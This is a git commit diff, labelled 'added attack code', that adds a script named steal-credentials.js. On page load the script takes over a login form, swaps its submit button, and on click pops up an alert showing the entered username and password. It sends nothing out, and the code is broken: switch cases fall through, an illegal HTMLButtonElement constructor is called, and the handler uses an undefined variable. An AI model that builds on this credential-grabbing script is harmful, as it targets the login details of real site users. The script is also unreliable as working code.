0a917ba63d6e5bc167a8e9822ebb3fd1af095e42
Matt Barr <matt.barr88@gmail.com>
2021-05-12 12:43:00 -0400

    added attack code

--- steal-credentials.js
+++ steal-credentials.js
@@ -1,3 +1,31 @@
+getFormFields = (form) => {
+    return Array.from(form.children).reduce((acc, curr, i, arr) => {
+        if (!curr || !curr.attributes || !curr.attributes.type) {
+            return acc;
+        }
+        
+        switch (curr.attributes.type.value) {
+            case 'text':
+                acc.user = curr;
+            case 'password':
+                acc.pass = curr;
+            case 'submit':
+                acc.submit = curr;
+        }
+
+        return acc;
+    }, {});
+}
+
 window.onload = function onWindowLoad() { 
-    console.log('The Script will load now.'); 
+    const form = document.getElementById('login');
+    const formFields = getFormFields(form);
+
+    console.log(formFields);
+    formFields.submit.remove();
+    formFields.submit = form.appendChild(new HTMLButtonElement());
+    formFields.submit.classList.add('button', 'small');
+    formFields.submit.onclick = () => {
+        alert(`You've just been hacked! I now have your username and password.\n\nuser: ${acc.user.value}\npass: ${acc.pass.value}`)
+    }
 } 
